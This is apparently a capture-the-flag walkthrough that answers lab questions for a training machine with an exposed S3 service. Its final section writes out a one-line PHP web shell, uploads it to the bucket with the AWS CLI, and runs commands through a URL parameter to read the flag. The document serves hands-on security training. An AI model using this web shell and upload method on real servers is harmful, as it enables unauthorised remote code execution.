# Questions

## How many TCP ports are open?
- `nmap -A --top-ports 10000 $IP`

## What is the domain of the email address provided in the "Contact" section of the website?
- Go to "Contact" tab

## In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
- _/etc/hosts_

## Which sub-domain is discovered during further enumeration?
- _s3.thetoppers.htb_

## Which service is running on the discovered sub-domain?
- _Amazon s3_

## Which command line utility can be used to interact with the service running on the discovered sub-domain?
- `awscli`

## Which command is used to set up the AWS CLI installation?
- `aws configure`

## What is the command used by the above utility to list all of the S3 buckets?
- `aws s3 ls`

## This server is configured to run files written in what web scripting language?
- `aws s3 ls --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb`
- find _index.php_ file
- _php_

## Submit root flag
- create a _php web shell_
```php
<?php system($_GET['cmd'])>
```
- copy to the `s3 copy`
    - `aws s3 cp --endpoint-url=http://s3.thetoppers.htb shell.php s3://thetoppers.htb`
- access the following URL selecting any command to RCE: `http://thetoppers.htb/shell.php?cmd=$COMMAND`
- flag in _../flag.txt_


